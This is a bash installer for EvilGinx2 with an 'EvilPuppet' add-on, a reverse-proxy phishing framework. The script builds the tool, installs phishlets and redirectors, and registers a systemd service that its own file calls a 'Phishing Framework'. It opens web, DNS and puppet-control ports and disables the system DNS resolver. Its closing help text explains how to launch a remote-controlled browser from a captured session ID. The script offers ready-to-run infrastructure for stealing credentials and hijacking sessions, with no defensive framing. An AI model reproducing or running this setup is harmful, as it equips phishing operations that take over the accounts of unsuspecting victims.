#!/bin/bash
#
# EvilGinx2 + EvilPuppet — Debian Setup Script
#
# Installs everything needed to build and run evilginx with EvilPuppet on Debian 11/12.
# Run as root or with sudo:
#
#   chmod +x setup-debian.sh
#   sudo ./setup-debian.sh
#
set -euo pipefail

# ─── Colors ──────────────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BOLD='\033[1m'
NC='\033[0m'

banner() {
    echo -e "${CYAN}"
    echo "  ╔══════════════════════════════════════════════╗"
    echo "  ║   EvilGinx2 + EvilPuppet — Debian Setup     ║"
    echo "  ╚══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

info()    { echo -e "  ${GREEN}[+]${NC} $*"; }
warn()    { echo -e "  ${YELLOW}[!]${NC} $*"; }
error()   { echo -e "  ${RED}[-]${NC} $*"; }
step()    { echo -e "\n${BOLD}==> $*${NC}"; }

banner

# ─── Preflight ───────────────────────────────────────────────────────
if [ "$(id -u)" -ne 0 ]; then
    error "This script must be run as root (use sudo)."
    exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
INSTALL_DIR="/opt/evilginx"
GO_VERSION="1.22.5"
GO_ARCH="amd64"

# Detect architecture
MACHINE=$(uname -m)
case "$MACHINE" in
    x86_64)  GO_ARCH="amd64" ;;
    aarch64) GO_ARCH="arm64" ;;
    armv*)   GO_ARCH="armv6l" ;;
    *)       error "Unsupported architecture: $MACHINE"; exit 1 ;;
esac

# ─── Step 0: Clean up leftover artifacts ─────────────────────────────
step "Cleaning up leftover artifacts to free disk space"
FREED=0

# Go build cache (can grow to hundreds of MB)
if [ -d "/root/.cache/go-build" ]; then
    SZ=$(du -sm /root/.cache/go-build 2>/dev/null | awk '{print $1}')
    rm -rf /root/.cache/go-build
    FREED=$((FREED + SZ))
    info "Cleared Go build cache (${SZ}MB)"
fi

# Go module cache
if [ -d "/root/go/pkg/mod" ]; then
    SZ=$(du -sm /root/go/pkg/mod 2>/dev/null | awk '{print $1}')
    rm -rf /root/go/pkg/mod
    FREED=$((FREED + SZ))
    info "Cleared Go module cache (${SZ}MB)"
fi

# Previous build artifacts in the source directory
for f in "$SCRIPT_DIR/build/evilginx" "$SCRIPT_DIR/evilginx2" "$SCRIPT_DIR/evilginx"; do
    if [ -f "$f" ]; then
        SZ=$(du -sm "$f" 2>/dev/null | awk '{print $1}')
        rm -f "$f"
        FREED=$((FREED + SZ))
        info "Removed old binary: $f (${SZ}MB)"
    fi
done

# Stale vendor directory (will be recreated by go mod vendor)
if [ -d "$SCRIPT_DIR/vendor" ]; then
    SZ=$(du -sm "$SCRIPT_DIR/vendor" 2>/dev/null | awk '{print $1}')
    rm -rf "$SCRIPT_DIR/vendor"
    FREED=$((FREED + SZ))
    info "Cleared stale vendor directory (${SZ}MB)"
fi

# APT package cache
if [ -d "/var/cache/apt/archives" ]; then
    SZ=$(du -sm /var/cache/apt/archives 2>/dev/null | awk '{print $1}')
    apt-get clean -qq 2>/dev/null || true
    NEWZ=$(du -sm /var/cache/apt/archives 2>/dev/null | awk '{print $1}')
    DIFF=$((SZ - NEWZ))
    if [ "$DIFF" -gt 0 ]; then
        FREED=$((FREED + DIFF))
        info "Cleaned APT cache (${DIFF}MB)"
    fi
fi

# Old systemd journal logs (keep only last 50MB)
if command -v journalctl &>/dev/null; then
    journalctl --vacuum-size=50M >/dev/null 2>&1 && info "Trimmed systemd journal to 50MB"
fi

# Chromium crash dumps and temp data from previous puppet sessions
for d in /root/.config/chromium/Crash\ Reports /tmp/.org.chromium.Chromium* /tmp/chromium-* /tmp/puppeteer_dev_chrome_profile-*; do
    if [ -e "$d" ]; then
        SZ=$(du -sm "$d" 2>/dev/null | awk '{print $1}')
        rm -rf "$d"
        FREED=$((FREED + SZ))
        info "Removed Chromium temp: $d (${SZ}MB)"
    fi
done

# Old Go tarballs left in /tmp
for f in /tmp/go*.linux-*.tar.gz; do
    if [ -f "$f" ]; then
        SZ=$(du -sm "$f" 2>/dev/null | awk '{print $1}')
        rm -f "$f"
        FREED=$((FREED + SZ))
        info "Removed old Go tarball: $f (${SZ}MB)"
    fi
done

# Orphaned snap cache (if snap is present)
if command -v snap &>/dev/null; then
    snap list --all 2>/dev/null | awk '/disabled/{print $1, $3}' | while read snapname revision; do
        snap remove "$snapname" --revision="$revision" 2>/dev/null && info "Removed old snap revision: $snapname ($revision)"
    done
fi

if [ "$FREED" -gt 0 ]; then
    info "Total freed: ~${FREED}MB"
else
    info "Nothing significant to clean up"
fi

# Show current disk usage
info "Disk usage: $(df -h / | awk 'NR==2{print $3 " used / " $2 " total (" $5 " full)"}')"

# ─── Step 1: System packages ────────────────────────────────────────
step "Installing system dependencies"
apt-get update -qq
apt-get install -y -qq \
    build-essential \
    wget \
    curl \
    git \
    ca-certificates \
    gnupg \
    unzip \
    > /dev/null 2>&1
info "Base packages installed"

# ─── Step 2: Install Go (if not present or too old) ─────────────────
step "Checking Go installation"
NEED_GO=true
if command -v go &>/dev/null; then
    CURRENT_GO=$(go version | grep -oP 'go\K[0-9]+\.[0-9]+')
    REQUIRED="1.22"
    if [ "$(printf '%s\n' "$REQUIRED" "$CURRENT_GO" | sort -V | head -n1)" = "$REQUIRED" ]; then
        info "Go $CURRENT_GO already installed (>= $REQUIRED) — skipping"
        NEED_GO=false
    else
        warn "Go $CURRENT_GO is too old (need >= $REQUIRED) — upgrading"
    fi
fi

if $NEED_GO; then
    info "Installing Go $GO_VERSION ($GO_ARCH)..."
    GO_TAR="go${GO_VERSION}.linux-${GO_ARCH}.tar.gz"
    wget -q "https://go.dev/dl/${GO_TAR}" -O "/tmp/${GO_TAR}"
    rm -rf /usr/local/go
    tar -C /usr/local -xzf "/tmp/${GO_TAR}"
    rm -f "/tmp/${GO_TAR}"

    # Make Go available system-wide
    if ! grep -q '/usr/local/go/bin' /etc/profile.d/go.sh 2>/dev/null; then
        echo 'export PATH=$PATH:/usr/local/go/bin' > /etc/profile.d/go.sh
        chmod +x /etc/profile.d/go.sh
    fi
    export PATH=$PATH:/usr/local/go/bin
    info "Go $(go version | grep -oP 'go\K[0-9]+\.[0-9]+\.[0-9]+') installed to /usr/local/go"
fi

# ─── Step 3: Install Chromium (for EvilPuppet) ──────────────────────
step "Installing Chromium for EvilPuppet"
if command -v chromium &>/dev/null || command -v chromium-browser &>/dev/null; then
    CHROME_BIN=$(command -v chromium 2>/dev/null || command -v chromium-browser 2>/dev/null)
    info "Chromium already installed at $CHROME_BIN — skipping"
else
    apt-get install -y -qq chromium > /dev/null 2>&1 || \
    apt-get install -y -qq chromium-browser > /dev/null 2>&1 || {
        warn "Could not install via apt, trying snap..."
        snap install chromium 2>/dev/null || {
            error "Failed to install Chromium. Install manually:"
            error "  apt install chromium   OR   snap install chromium"
            error "Then set the path:  puppet chrome /path/to/chromium"
        }
    }

    CHROME_BIN=$(command -v chromium 2>/dev/null || command -v chromium-browser 2>/dev/null || echo "")
    if [ -n "$CHROME_BIN" ]; then
        info "Chromium installed at $CHROME_BIN"
    fi
fi

# ─── Step 4: Build EvilGinx ─────────────────────────────────────────
step "Building EvilGinx2"
cd "$SCRIPT_DIR"
export PATH=$PATH:/usr/local/go/bin

info "Running go mod vendor..."
go mod vendor 2>/dev/null || go mod tidy && go mod vendor

info "Compiling..."
mkdir -p ./build
go build -o ./build/evilginx -mod=vendor main.go
info "Binary built: $(ls -lh ./build/evilginx | awk '{print $5}') → ./build/evilginx"

# ─── Step 5: Install to /opt/evilginx ───────────────────────────────
step "Installing to $INSTALL_DIR"
mkdir -p "$INSTALL_DIR"
cp -f ./build/evilginx "$INSTALL_DIR/evilginx"
chmod +x "$INSTALL_DIR/evilginx"

# Copy phishlets and redirectors
mkdir -p "$INSTALL_DIR/phishlets"
mkdir -p "$INSTALL_DIR/redirectors"
if [ -d "$SCRIPT_DIR/phishlets" ]; then
    cp -r "$SCRIPT_DIR/phishlets/"* "$INSTALL_DIR/phishlets/" 2>/dev/null || true
fi
if [ -d "$SCRIPT_DIR/redirectors" ]; then
    cp -r "$SCRIPT_DIR/redirectors/"* "$INSTALL_DIR/redirectors/" 2>/dev/null || true
fi

# Symlink to PATH
ln -sf "$INSTALL_DIR/evilginx" /usr/local/bin/evilginx
info "Installed to $INSTALL_DIR and linked to /usr/local/bin/evilginx"

# ─── Step 6: Create systemd service ─────────────────────────────────
step "Creating systemd service"
cat > /etc/systemd/system/evilginx.service << 'UNIT'
[Unit]
Description=EvilGinx2 Phishing Framework with EvilPuppet
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/opt/evilginx/evilginx -p /opt/evilginx/phishlets -t /opt/evilginx/redirectors
WorkingDirectory=/opt/evilginx
Restart=on-failure
RestartSec=5
StandardOutput=journal
StandardError=journal

# Hardening
NoNewPrivileges=false
ProtectSystem=false

[Install]
WantedBy=multi-user.target
UNIT

systemctl daemon-reload
info "Systemd service created: evilginx.service"

# ─── Step 7: Firewall configuration ────────────────────────────────
step "Configuring firewall"
if command -v ufw &>/dev/null && ufw status | grep -q "active"; then
    info "UFW is active — opening required ports..."
    ufw allow 443/tcp  >/dev/null 2>&1 && info "  443/tcp (HTTPS) opened"
    ufw allow 80/tcp   >/dev/null 2>&1 && info "   80/tcp (HTTP) opened"
    ufw allow 53/udp   >/dev/null 2>&1 && info "   53/udp (DNS) opened"
    ufw allow 7777/tcp >/dev/null 2>&1 && info " 7777/tcp (EvilPuppet) opened"
elif command -v iptables &>/dev/null; then
    info "Opening ports via iptables..."
    for port_proto in "443:tcp" "80:tcp" "53:udp" "7777:tcp"; do
        port="${port_proto%%:*}"
        proto="${port_proto##*:}"
        if ! iptables -C INPUT -p "$proto" --dport "$port" -j ACCEPT 2>/dev/null; then
            iptables -I INPUT -p "$proto" --dport "$port" -j ACCEPT
            info "  ${port}/${proto} opened"
        else
            info "  ${port}/${proto} already open"
        fi
    done
    # Persist iptables rules if iptables-persistent is available
    if command -v netfilter-persistent &>/dev/null; then
        netfilter-persistent save >/dev/null 2>&1
        info "iptables rules saved"
    else
        warn "Install iptables-persistent to keep rules across reboots:"
        echo -e "    ${CYAN}apt install -y iptables-persistent${NC}"
    fi
else
    info "No firewall detected — ports should be open by default"
fi

# ─── Step 8: Stop conflicting services ──────────────────────────────
step "Resolving port conflicts"

# systemd-resolved holds port 53 — evilginx needs it for DNS
if systemctl is-active --quiet systemd-resolved 2>/dev/null; then
    info "Stopping and disabling systemd-resolved (conflicts with DNS on port 53)..."
    systemctl stop systemd-resolved
    systemctl disable systemd-resolved

    # Point /etc/resolv.conf to a real upstream DNS so the system still resolves
    if [ -L /etc/resolv.conf ]; then
        rm -f /etc/resolv.conf
    fi
    if ! grep -q 'nameserver' /etc/resolv.conf 2>/dev/null; then
        echo -e "nameserver 1.1.1.1\nnameserver 8.8.8.8" > /etc/resolv.conf
        info "Set /etc/resolv.conf to use 1.1.1.1 / 8.8.8.8"
    fi
    info "systemd-resolved stopped and disabled"
fi

# Warn about web servers that hold port 80/443
for svc in apache2 nginx; do
    if systemctl is-active --quiet "$svc" 2>/dev/null; then
        warn "$svc is running and may conflict with ports 80/443. To stop it:"
        echo -e "    ${CYAN}sudo systemctl stop $svc && sudo systemctl disable $svc${NC}"
    fi
done

# ─── Done ────────────────────────────────────────────────────────────
echo ""
echo -e "${GREEN}${BOLD}  ✓ Setup complete!${NC}"
echo ""
echo -e "  ${BOLD}Quick start:${NC}"
echo -e "    ${CYAN}sudo evilginx${NC}                              # run interactively"
echo -e "    ${CYAN}sudo systemctl start evilginx${NC}              # run as service"
echo -e "    ${CYAN}sudo systemctl enable evilginx${NC}             # auto-start on boot"
echo ""
echo -e "  ${BOLD}EvilPuppet (inside evilginx):${NC}"
echo -e "    ${CYAN}: puppet launch <session_id> <target_url>${NC}  # launch puppet browser"
echo -e "    ${CYAN}: puppet url <puppet_id>${NC}                   # get remote control URL"
echo -e "    ${CYAN}: puppet list${NC}                              # see active puppets"
echo ""
echo -e "  ${BOLD}Important:${NC}"
echo -e "    • Puppet web UI listens on port ${YELLOW}7777${NC} (auto-generated password shown at startup)"
echo -e "    • EvilPuppet uses Chromium at: ${YELLOW}$(command -v chromium 2>/dev/null || command -v chromium-browser 2>/dev/null || echo '/usr/bin/chromium')${NC}"
echo -e "    • Config stored in ${YELLOW}~/.evilginx/${NC}"
echo ""
